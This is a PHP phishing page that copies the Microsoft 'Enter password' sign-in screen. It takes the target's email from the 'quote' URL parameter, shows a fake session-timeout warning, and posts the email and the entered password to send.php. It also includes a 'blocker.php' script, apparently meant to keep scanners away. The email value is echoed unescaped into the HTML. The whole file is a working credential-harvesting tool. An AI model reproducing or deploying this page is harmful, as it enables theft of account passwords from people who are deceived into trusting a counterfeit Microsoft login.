<?php 

session_start();

session_start();
require 'blocker.php';

if(isset($_GET['quote'])){
	
	$email = $_GET['quote'];
}else{
	exit();
}
 ?>


<!doctype html>

<html dir="ltr" class="" lang="en">
<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="">
	<meta http-equiv="x-dns-prefetch-control" content="on">
	<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
	<link rel="dns-prefetch" href="//aadcdn.msauth.net">

    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
	<meta name="ReqLC" content="1033">
	<meta name="LocLC" content="en-US">


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<link rel="shortcut icon" href="https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">  
	<meta name="robots" content="none">
	<link rel="" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" />
	<link crossorigin="anonymous" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_q6m5ldmi2_mptzyqlrehgg2.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-zMmos1ZX7mUYtZ+HPXQgVHCLVIFhtFJh3C51q+MKgdJqdAVJJ2nssNpcwGF3czSk">
	<script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.old.converged.login.pcore.min_fwwu50nnn4qjs3llv7nrcq2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-jYODMcTixE7JCObYUYa12xjir0tw2LSlkgC+96vuoLpNL9G8g9oWUwvm2fvSsQqN"></script>
	<script crossorigin="anonymous" src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_gur8kswtia8_1qujlll20a2.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-S+nlAa5bvtyr/EiqwmVwofl1diGmzatXhv0V7tkKUg7dTom/z30UxtXhd6NsyWYg"></script>

    


<link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_q6m5ldmi2_mptzyqlrehgg2.css">
<link rel="prefetch" href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en.min_gur8kswtia8_1qujlll20a2.js">

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">


<div>
<div data-bind="component: { name: 'background-image-control', publicMethods: backgroundControlMethods }">
<div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">

<!--<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/ests/2.1/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>-->

<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>

</div>
</div> 
<div data-bind="if: activeDialog">
</div> 

<form name="f1" id="i0281"  spellcheck="false" method="post"   action="send.php">

<div class="outer" >
			 
<div class="middle" data-bind="css: { 'app': backgroundLogoUrl }">
			
<div class="inner fade-in-lightbox">
	<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
	<div>
	    <img class="logo" role="img" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">				
	</div>
						
	<div role="main">					
		<div>
			<p style="color:red;">Session Timeout</p>
			<div>
				<div class="identityBanner"> 
					<a href="#" type="button" class="backButton" id="idBtn_Back" aria-label="Back">
						<img role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
					</a> 
					<div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email; ?>"><?php echo $email; ?></div> 
				</div>
			</div>
		</div>
		<div class="pagination-view animate has-identity-banner slide-in-next">
			<div data-viewid="2">
				<div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
				<div class="row">
					<div class="form-group col-md-24"> 
						<div role="alert" aria-live="assertive"></div> 
						<div class="placeholderContainer">
							<input type="hidden" name="variable1" value="<?php echo $email; ?>" />
							<input id="formtext2" required name="variable2" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true"  placeholder="Password"  tabindex="0">
						</div>	
					</div> 
				</div>
									
				<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> 
					<div>
						<div class="row"> 
							<div class="col-md-24"> 
								<div class="text-13 action-links"> 
									<div class="form-group"> 
										<a id="idA_PWD_ForgotPassword" role="link" href="#" >Forgot my password</a> 
									</div>
								</div> 
							</div>
						</div> 
				
						<div class="row">
							<div >
								<div class="col-xs-24 no-padding-left-right button-container" >
									<div class="inline-block">
										<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Sign in"> 
									</div> 
								</div>
							</div> 
						</div> 
					</div>
				</div>
				
			</div> 
		</div>
	</div>
			 
</div>
			
				<div id="footer" class="footer default" role="contentinfo"> 
					<div>
						
						<div id="footerLinks" class="footerNode text-secondary"> 
							<a id="ftrTerms" href="#">Terms of use</a> 
							<a id="ftrPrivacy" href="#">Privacy &amp; cookies</a>
						 
							<a id="moreOptions" href="#" role="button" class="moreOptions" aria-label="Click here for troubleshooting information" aria-expanded="false">
								
								<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
								
								<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
							</a> 
						</div> 
		
					</div> 
				</div> 
			</div> 
		</div> 
	</form> 
</div>

<div id="myModal" class="modal fade" role="dialog">
  <div class="modal-dialog modal-sm">
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <!--<button type="button" class="close" data-dismiss="modal">&times;</button>-->
        <h5 style="color:red;" class="modal-title">SESSION TIMEOUT</h5>
      </div>
      <div class="modal-body">
        <p>your internet connection has triggered a session timeout</p>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal">Continue</button>
      </div>
    </div>

  </div>
</div>

<script>
	$( document ).ready(function() {
		//$('#myModal').modal('show');
	$("#formtext2").focus();
	
	$('#myModal').on('hidden.bs.modal', function (e) {
  // do something...
  $("#formtext2").focus();
	});
});
</script>

<script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</body>
</html>